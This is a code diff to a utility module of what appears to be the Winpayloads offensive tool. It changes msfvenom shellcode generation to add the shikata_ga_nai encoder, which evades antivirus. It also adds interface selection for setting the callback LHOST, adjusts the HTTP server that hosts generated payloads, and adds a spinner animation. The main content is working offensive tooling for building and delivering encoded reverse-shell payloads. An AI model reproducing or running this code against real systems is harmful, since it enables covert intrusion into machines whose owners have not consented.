@@ -1,4 +1,5 @@
 # -*- coding: utf-8 -*-
+from __future__ import unicode_literals
 import os
 import socket
 import re
@@ -24,14 +25,19 @@ import asyncore
 import ssl
 import threading
 import prompt_toolkit
+from prompt_toolkit.contrib.completers import WordCompleter
+import netifaces
+
+
 
 t = blessed.Terminal()
+
 
 def payloaddir():
     return os.path.expanduser('~') + '/winpayloads'
 
 def msfvenomGeneration(payload, ip, port):
-    p = subprocess.Popen(['msfvenom', '-p', payload, 'LHOST=' + str(ip), 'LPORT=' + str(port), '-f', 'python'], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    p = subprocess.Popen(['msfvenom', '-p', payload, 'LHOST=' + str(ip), 'LPORT=' + str(port), '-f', 'python', '-e', 'x86/shikata_ga_nai'], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     LOADING = Spinner('Generating Shellcode')
     while p.poll() == None:
         LOADING.Update()
@@ -40,12 +46,51 @@ def msfvenomGeneration(payload, ip, port):
     sys.stdout.flush()
 
     payload = p.stdout.read()
-    exec(payload)
-    return buf
+    compPayload = re.findall(r'"(.*?)"', payload)
+
+    return ''.join(map(str, compPayload))
 
 class HANDLER(SimpleHTTPServer.SimpleHTTPRequestHandler): #patching httpserver to shutup
     def log_message(self, format, *args):
         return
+
+class InterfaceSelecta():
+    def __init__(self):
+        try:
+            self.defaultInterface = netifaces.gateways()['default'][netifaces.AF_INET][1]
+        except KeyError:
+            pass
+
+    def ChooseInterface(self, set=False, test=False):
+        num = 0
+        interfaces = []
+
+        for interface in netifaces.interfaces():
+            num += 1
+            try:
+                interfaces += [{'num': num, 'interface': interface, 'addr': netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']}]
+            except Exception:
+                break
+
+        for i in interfaces:
+            isdefault = ''
+            if self.defaultInterface == i['interface']:
+                isdefault = t.bold_green + ' [Default]' + t.normal
+                defaultsetinterface = i
+            if set:
+                print t.bold_yellow + str(i['num']) +  ': ' + t.normal + i['addr'] + ' (' + i['interface'] + ')' + isdefault
+
+        if set:
+            while True:
+                interinput = prompt_toolkit.prompt("Interface > ", completer=WordCompleter([str(x+1) for x in range(num-1)]), style=prompt_toolkit.styles.style_from_dict({prompt_toolkit.token.Token: '#FFCC66'}))
+                for i in interfaces:
+                    if interinput == str(i['num']):
+                        self.defaultInterface = i['interface']
+                        return i
+        else:
+            print defaultsetinterface
+            return defaultsetinterface
+
 
 
 class SHELLCODE(object):
@@ -145,8 +190,29 @@ class FUNCTIONS(object):
             os.chdir(payloaddirectory)
             httpd = SocketServer.TCPServer(('', port), HANDLER)
             httpd.serve_forever()
+        except KeyboardInterrupt:
+            pass
         except:
-            print t.bold_red + '\n[*] WebServer Error' + t.normal
+            print t.bold_red + '\n[*] Port in use' + t.normal
+
+
+    def ChooseInterface(self):
+        import netifaces
+        defaultInterface = netifaces.gateways()['default'][netifaces.AF_INET]
+        num = 0
+
+        for interface in netifaces.interfaces():
+            isDefault = ''
+            num += 1
+            if interface == defaultInterface[1]:
+                isDefault = t.bold_green + ' *' + t.normal
+
+            interfaces = [(str(num), {'interface': interface, 'addr': netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr'], 'default': isDefault})]
+
+            for i in interfaces:
+                print t.bold_yellow + i[0] + ': ' + t.normal + i[1]['addr'] + i[1]['default']
+
+        #interfaceSelection = prompt_toolkit.prompt("Interface >", completer=WordCompleter(['back', 'exit']), style=prompt_toolkit.styles.style_from_dict({prompt_toolkit.token.Token: '#FFCC66'})
 
 
     def DoServe(self, IP, payloadname, payloaddir, port, printIt):
@@ -191,7 +257,8 @@ class Spinner(object):
             ["▖","▘","▝","▗"],
             ["←","↖","↑","↗","→","↘","↓","↙"],
             ["█▒▒▒▒▒▒","██▒▒▒▒▒","███▒▒▒▒","████▒▒▒","█████▒▒","██████▒","███████"],
-            ["◢","◣","◤","◥"]
+            ["◢","◣","◤","◥"],
+            ["( ●    )", "(  ●   )", "(   ●  )", "(    ● )", "(     ●)", "(    ● )", "(   ●  )", "(  ●   )", "( ●    )", "(●     )"]
             ]
         self.loading = list(text)
         self.randomchoice = random.choice(self.spinner)
